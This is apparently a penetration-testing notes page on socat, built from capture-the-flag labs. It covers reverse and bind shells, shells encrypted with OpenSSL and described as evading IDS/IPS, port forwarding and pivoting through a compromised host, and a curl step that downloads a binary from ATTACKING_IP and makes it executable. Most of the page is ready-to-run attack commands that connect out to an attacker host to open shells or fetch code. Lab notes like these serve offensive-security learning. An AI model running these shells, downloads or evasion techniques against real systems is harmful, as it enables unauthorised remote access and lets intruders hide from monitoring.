# socat

## Wreath Commands

```bash
sudo nc -lvnp 443
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
./socat-USERNAME tcp-l:8000 tcp:ATTACKING_IP:443 &
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
Used on: **Wreath** - documented reverse shell relays, local forwards, quiet outbound relays, and OpenSSL-wrapped forwards.

"netcat on steroids". Bidirectional stream relay between any two endpoints — TCP, UDP, UNIX socket, file, PTY, OpenSSL, child process — with PTY allocation, fork-per-connection, EOF handling and SSL all built in. The Swiss-army knife for **stable** reverse shells, port forwarding, and lab-style "host this script on a TCP port" patterns.

It's often pre-installed on Debian/Ubuntu derivatives. If not, drop a [static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) the same way you'd drop nmap.

## Commands Used

### Reverse shell — fully-interactive, stable PTY
```bash
# Attacker — listener with PTY allocation
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Target
socat TCP:$LHOST:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
This is the gold-standard reverse shell — full TTY, no `Ctrl-C`-kills-the-shell, tab-completion, signals work. Replaces the four-step `python -c pty.spawn ; Ctrl-Z ; stty raw -echo ; fg ; reset` dance.

### Reverse shell — quick / on a stripped target
```bash
# Attacker
nc -lvnp 4444
# Target
socat TCP:$LHOST:4444 EXEC:/bin/bash
```

### Bind shell (target listens, attacker connects)
```bash
# Target
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr
# Attacker
socat - TCP:$TARGET:9999
```

### "Host this script on a TCP port" — debug pattern that becomes RCE
```bash
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0
```
Used on: **bsidesgtdevelpy** — this is what's serving the Python script on port 10000. The `EXEC:` clause re-spawns the script per connection. If the script `eval`s/`input()`s attacker bytes -> RCE. See [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).

### Local port forward (akin to `ssh -L`)
```bash
# Forward attacker:8080 -> target:80
socat TCP-LISTEN:8080,fork TCP:$TARGET:80
```

### Reverse port forward through a foothold (attacker:80 reachable from inside the target net)
```bash
# On the target
socat TCP-LISTEN:8888,fork TCP:internal-host:8080
```

### SSL-Encrypted Shells

One of the great things about socat is that it's capable of creating **encrypted shells** — both bind and reverse. Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass IDS/IPS as a result.

Any time `TCP` was used as part of a command, replace it with `OPENSSL` to get an encrypted equivalent.

#### 1. Generate the certificate (on the attacking machine)

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

This creates a 2048-bit key with a matching self-signed certificate, valid for just under a year. The fields it prompts for can be left blank or filled randomly.

Merge both files into a single `.pem`:

```bash
cat shell.key shell.crt > shell.pem
```

> **Note:** The certificate must always be used on the **listening** side — attacker for reverse shells, target for bind shells.

#### 2. Reverse shell (encrypted)

```bash
# Attacker — listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Target — connect back
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

`verify=0` tells socat not to validate that the certificate is properly signed by a recognised authority (self-signed is fine).

#### 3. Bind shell (encrypted)

```bash
# Target — listener (cert must be here)
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Attacker — connect
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

For a Windows bind shell, copy the `.pem` file to the target before running the listener.

#### 4. Stable PTY reverse shell (encrypted)

Combine OpenSSL transport with full PTY flags for a fully interactive encrypted shell:

```bash
# Attacker
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 file:`tty`,raw,echo=0

# Target
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Plain proxy (UDP / mixed)
```bash
socat UDP-LISTEN:53,fork UDP:1.1.1.1:53
socat UNIX-LISTEN:/tmp/sock,fork TCP:127.0.0.1:8080      # UNIX <-> TCP bridge
```

## Reading socat clauses

| Clause | Meaning |
|--------|---------|
| `TCP:host:port` | connect to host:port |
| `TCP-LISTEN:port,fork,reuseaddr` | listen, accept many concurrent connections |
| `UDP:`, `UDP-LISTEN:` | UDP variants |
| `EXEC:cmd[,pty][,stderr][,setsid]` | spawn cmd, wire its stdio to the other side |
| `OPENSSL:`, `OPENSSL-LISTEN:` | TLS variants — `cert=`, `key=`, `verify=` |
| `UNIX-CONNECT:/path`, `UNIX-LISTEN:/path` | UNIX-domain sockets |
| `FILE:path,creat`, `OPEN:path,append` | read / write a file as one side |
| `STDIO`, `STDIN`, `STDOUT`, `-` | the local process's stdio |
| `pty,echo=0` | allocate a PTY, no local echo (gives a stable shell) |
| `setsid,sigint,sane` | new session, forward SIGINT, sane termios -- pair with `pty` |

## Why socat over netcat

| Need | netcat | socat |
|------|--------|-------|
| Reverse shell | yes (basic) | yes (full PTY, stable) |
| Bind shell | yes | yes |
| Port forwarding | painful (multiple `nc` + `mkfifo`) | one line |
| TLS | no | yes |
| UDP relay | one direction | full |
| Survives across multiple connections | requires `-k` | `fork` does it |

## Related
- [netcat](netcat.md) -- the simpler cousin
- [python-input-injection.md](../../exploits/web-rce/python-input-injection.md) -- bsidesgtdevelpy's `EXEC:` foothold
- [ssh-tunneling.md](../../techniques/pivot/ssh-tunneling.md) -- when SSH access is also available
- [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md) -- one of the static binaries you'd want inside a container